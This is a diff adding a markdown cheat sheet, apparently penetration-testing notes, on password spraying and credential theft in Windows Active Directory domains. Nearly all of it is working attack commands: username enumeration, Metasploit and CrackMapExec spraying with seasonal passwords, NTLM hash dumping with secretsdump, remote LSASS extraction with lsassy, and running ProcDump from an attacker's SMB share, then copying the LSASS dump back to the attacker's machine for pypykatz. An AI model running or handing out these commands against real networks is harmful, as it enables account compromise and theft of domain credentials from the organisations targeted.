@@ -1,0 +1,69 @@
+# Password spraying
+
+A good strategy is to figure out the syntax of the username and then download a common name list from here:
+https://github.com/insidetrust/statistically-likely-usernames
+
+phonebook.cz - grab email lists and potential username format
+
+h8mail with dehashed API can find username format
+
+Use those lists with a tool called Kerbrute to find valid usernames:
+https://github.com/ropnop/kerbrute
+
+Then use the Metasploit module below to find at least one username and password combination. Use common passwords like Summer2021, Spring2021, Spring21, Spring21, etc.
+
+Once you have one valid username account you can use a tool called ldapdomaindump to get a full list of valid domain users from the domain for password spraying. Cut the output from the tool to get one full list of valid usernames to try. Then spray again with that list. Use Metasploit's smb_login module for the best results.
+cat domain_users.grep | cut -d $"\t" -f 2 or just cut -f 2
+
+# Option.1 Metasploit - use the smb_login module to password spray only 1 Domain Controller. You can also use this module for password reuse throughout the network.
+msfconsole
+
+use auxiliary/scanner/smb/smb_login
+
+set USERFILE <list.of.usernames>
+
+set SMBPASS <password.or.hash.to.spray>
+
+set SMBDOMAIN <domain.name> or . for local account
+
+set RHOSTS <domain.controller.ip>
+
+set THREADS 5
+
+run 
+
+# Option.2 - Crackmapexec - use CME to password spray only 1 Domain Controller. You can also use this module for password reuse throughout the network.
+
+crackmapexec -t 5 smb <domain.controller.ip> -d <domain> -u /path/to/user.list.txt -p <password.to.spray>
+
+# This is an example for password spraying a local account
+
+crackmapexec -t smb <hosts> -d . -u <username> -p <password> 
+
+# Extract Passwords and Hashes
+
+# Dump NTLM hashes from a target system and output to a file. If you don't have a password you can use an NTLM hash with the -hashes flag.
+
+python3 ~path-to-impacket/examples/secretsdump.py <domain>/<user>@<target.ip> -just-dc -user-status -output ntlm.hashes.txt
+
+# Run lsassy tool to extract credentials from lsass remotely
+
+lsassy -d . -u administrator -H <LM:NT.hash> <host>
+
+# Create an LSASS dump and extract clear-text passwords.
+# Start an SMB share to share Procdump64.exe on your machine called test.
+
+Kali root# python3 ~path-ti-impacket/examples/smbserver.py -smb2support test /opt/ipt/5.passwords/
+
+# Run Procdump64.exe on target system and copy dump to local Kali machine.
+
+Windows C:\> \\<kali.ip>\test\ProcDump64.exe -accepteula -m lsass.exe lsass.dmp
+Windows C:\> copy lsass.dmp \\<kali.ip>\lsass.dmp
+
+# Run pypykatz against the lsass dump to retrieve clear-text passwords.
+
+Kali root# pypykatz lsa minidump lsass.dmp | tee lsass-dump.txt
+
+# Run GPP_enum tool
+
+use auxiliary/scanner/smb/smb_enum_gpp
